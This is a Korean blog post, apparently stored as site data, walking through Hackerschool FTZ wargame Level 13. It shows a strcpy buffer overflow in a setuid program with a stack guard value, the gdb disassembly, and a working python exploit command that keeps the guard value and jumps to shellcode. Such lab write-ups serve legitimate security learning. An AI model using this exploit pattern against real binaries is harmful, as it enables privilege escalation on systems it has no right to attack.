{"componentChunkName":"component---src-templates-post-template-tsx","path":"/221003/","result":{"data":{"allMarkdownRemark":{"edges":[{"node":{"html":"<h3>0. 들어가기 전에</h3>\n<p>또 다시 나온 BOF 문제이다. 하지만 이번 문제는 아주 조금 더 어려운게, 중간에 long i라는 값을 끼워넣어서, 이 값이 변조되었을 경우는 프로그램의 실행을 거부하는 형식의, 아주 기초적인 방어를\r\n하고 있다. 이런 경우에는 그냥 Dummy코드를 짤 때, 저 long i 변수의 정확한 위치를 파악해서 Dummy코드 사이 i값이 오는 위치에 i 값을 정확하게 넣어주면 된다. 바로 코드로 들어가보자.</p>\n<h3>1. Level 13</h3>\n<p>일단 hint를 확인해 보면 attackme의 소스코드가 다음과 같이 나온다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">#include &lt;stdlib.h>\r\n\r\nmain(int argc, char *argv[])\r\n{\r\n   long i=0x1234567;\r\n   char buf[1024];\r\n\r\n   setreuid( 3094, 3094 );\r\n   if(argc > 1)\r\n   strcpy(buf,argv[1]);\r\n\r\n   if(i != 0x1234567) {\r\n   printf(\" Warnning: Buffer Overflow !!! \\n\");\r\n   kill(0,11);\r\n   }\r\n}</code></pre></div>\n<p>“들어가기 전에” 에서 설명했지만, 이번에는 i값이 위조되었는지를 확인하는 코드가 if 문에 작성되어있다. 따라서 우리의 더미 데이터에도 i의 본래 값이 들어가있어야 한다.</p>\n<p>얼른 카피해서 test 파일을 만들고 gdb로 disassemble 해보자. disassemble 하니 다음과 같은 어셈블리 코드가 실행되었다는 것을 알 수 있다.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">0x080483c8 &lt;main+0>:    push   ebp\r\n0x080483c9 &lt;main+1>:    mov    ebp,esp\r\n0x080483cb &lt;main+3>:    sub    esp,0x418\r\n0x080483d1 &lt;main+9>:    and    esp,0xfffffff0\r\n0x080483d4 &lt;main+12>:   mov    eax,0x0\r\n0x080483d9 &lt;main+17>:   sub    esp,eax\r\n0x080483db &lt;main+19>:   mov    DWORD PTR [ebp-12],0x1234567\r\n0x080483e2 &lt;main+26>:   sub    esp,0x8\r\n0x080483e5 &lt;main+29>:   push   0xc16\r\n0x080483ea &lt;main+34>:   push   0xc16\r\n0x080483ef &lt;main+39>:   call   0x80482e8 &lt;setreuid>\r\n0x080483f4 &lt;main+44>:   add    esp,0x10\r\n0x080483f7 &lt;main+47>:   cmp    DWORD PTR [ebp+8],0x1\r\n0x080483fb &lt;main+51>:   jle    0x8048417 &lt;main+79>\r\n0x080483fd &lt;main+53>:   sub    esp,0x8\r\n0x08048400 &lt;main+56>:   mov    eax,DWORD PTR [ebp+12]\r\n0x08048403 &lt;main+59>:   add    eax,0x4\r\n0x08048406 &lt;main+62>:   push   DWORD PTR [eax]\r\n0x08048408 &lt;main+64>:   lea    eax,[ebp-1048]\r\n0x0804840e &lt;main+70>:   push   eax\r\n0x0804840f &lt;main+71>:   call   0x8048308 &lt;strcpy>\r\n0x08048414 &lt;main+76>:   add    esp,0x10</code></pre></div>\n<p>확인해 보니 우리의 1024크기의 배열은 ebp-1048번째 위치에 생성되었고, i의 값은 ebp-12의 위치에 생성되었다. 이를 이용해 대략적인 레지스터의 스택을 파악해볼 수 있다. 다음의 그림을 그려보았다.</p>\n<p><img src=\"../contentImages/Level13.png\" alt=\"register_outlook\"></p>\n<p>쉘코드를 짜고, 주소를 확인해보니 다음과 같다 :</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\">./getenv => 0xbffffc1a => \\x1a\\xfc\\xff\\xbf // 원래 주소를 little endian으로 변환했다.</code></pre></div>\n<p>환경변수의 생성과 주소 파악하는법에 대해 모른다면 다음의 글을 참조하자! : <a href=\"https://hosahn.github.io/221002/\" target=\"_blank\" rel=\"nofollow\">FTZ Level 12</a></p>\n<p>이제 필요한 도구가 모두 모였다. attackme 함수를 실행하고, argv로 다음과 같은 문장을 넘겨주자.</p>\n<div class=\"gatsby-highlight\" data-language=\"text\"><pre class=\"language-text\"><code class=\"language-text\"> ./attackme `python -c 'print \"\\x90\"*1036+\"\\x67\\x45\\x23\\x01\"+\"\\x90\"*12+\"\\x1a\\xfc\\xff\\xbf\"'`</code></pre></div>\n<p>설명하자면 1036개의 NOP 더미를 넘기고, ebp-8시점에서 i의 주소값을 정확히 정의했으며, 그 후에 또 12개의 NOP 더미를 넘기고 나서 shell코드의 주소를 넘겨주었다.</p>\n<p>이해가 가지 않는다면 위의 그림을 다시한번 확인해보자. 실행시키니 shell을 얻을 수 있었다. my-pass로 비밀번호를 확인하였다.</p>\n<p>비밀번호 : what the n(여러분들이 아는 그 후드의 단어..) want? (FTZ가 미친듯 하다. 내 외국인 친구들도 보는 블로그라 단어를 쓰진 않겠다..)</p>\n<hr>\n<h2>Source</h2>\n<ul>\n<li>해커스쿨 FTZ</li>\n<li>Me!</li>\n</ul>","frontmatter":{"title":"해커스쿨 FTZ 레벨 13","summary":"","date":"2022.10.03.","before":"2022.10.02.","after":"2022.10.04.","categories":["C-SEC","KOR","PWN"],"thumbnail":{"childImageSharp":{"gatsbyImageData":{"layout":"constrained","placeholder":{"fallback":"data:image/jpeg;base64,/9j/2wBDAAEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/2wBDAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQEBAQH/wgARCAANABQDASIAAhEBAxEB/8QAGQAAAgMBAAAAAAAAAAAAAAAAAAYBBAcJ/8QAFQEBAQAAAAAAAAAAAAAAAAAABQT/2gAMAwEAAhADEAAAAecqxk1Wh+RFETf/xAAbEAACAwEBAQAAAAAAAAAAAAAEBQECAwYAB//aAAgBAQABBQLk/ozxAp6+x250njzKluVVkeVbX188ot//xAAfEQACAgIBBQAAAAAAAAAAAAACAwERBBMSACExkdL/2gAIAQMBAT8B2ilGRqfkmnJaO5BG2Fm7EEBS+Rl5DcJ1Lio5UF8u9RLSvwPufnr/xAAeEQACAgICAwAAAAAAAAAAAAACAwEEEiEAEyIx0f/aAAgBAgEBPwGsMuOvJoqKdUSa02ASruFNphvYnsFMEQTYJzZgvHNpzjM7LvZGsla16P5z/8QAJxAAAgECBQMEAwAAAAAAAAAAAQIDBBIABRETISIxQRQVIzKSoeH/2gAIAQEABj8Cr8omzfNjSx0cVDkTQ1ctNLk8805aGopgwe2jCPUeqprZBLtoiABi49xzLNBmMiyVFOlaqho6iOCd13t5eH3VtdLF05PQCcctz56Tx+sEaq61NHJQkSC/bjHzI8Wv1lR06X72ySL2Y42nGqqblFzWp5NijQKWJBJHkdscKfy/mP/EAB0QAQADAAIDAQAAAAAAAAAAAAEAESFBUTFhcYH/2gAIAQEAAT8hzE24tLQPVhJNJSUr0wCVxU0kcX1weVyNLTnpyNwLOBO6TwpZRaBNbsWfuEhKrYwKf3z+J//aAAwDAQACAAMAAAAQkN//xAAaEQEAAgMBAAAAAAAAAAAAAAABETEAIaFh/9oACAEDAQE/EEyD5/zMnaTFJWUhNy32jxPPc//EABoRAQACAwEAAAAAAAAAAAAAAAERMQAhQZH/2gAIAQIBAT8QEX6POL11GhsyL86M8GpYB4FVWf/EABgQAQEBAQEAAAAAAAAAAAAAAAERIQAx/9oACAEBAAE/EJoUOgd33xFiGjvwLQjW8KY0zoweyIVAKQD6LTn7qVBNlE8EIiuUSHK55IjERS7B4w67dNSnsqKzV7//2Q=="},"images":{"fallback":{"src":"/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg","srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e6e0/C_Sec.jpg 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/edde1/C_Sec.jpg 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/8c915/C_Sec.jpg 1080w","sizes":"(min-width: 1080px) 1080px, 100vw"},"sources":[{"srcSet":"/static/19e515bba8750881aa8c0a71dc14e660/2e1cd/C_Sec.webp 270w,\n/static/19e515bba8750881aa8c0a71dc14e660/08f1e/C_Sec.webp 540w,\n/static/19e515bba8750881aa8c0a71dc14e660/c34ed/C_Sec.webp 1080w","type":"image/webp","sizes":"(min-width: 1080px) 1080px, 100vw"}]},"width":1080,"height":720}},"publicURL":"/static/19e515bba8750881aa8c0a71dc14e660/C_Sec.jpg"}}}}]}},"pageContext":{"slug":"/221003/"}},"staticQueryHashes":[],"slicesMap":{}}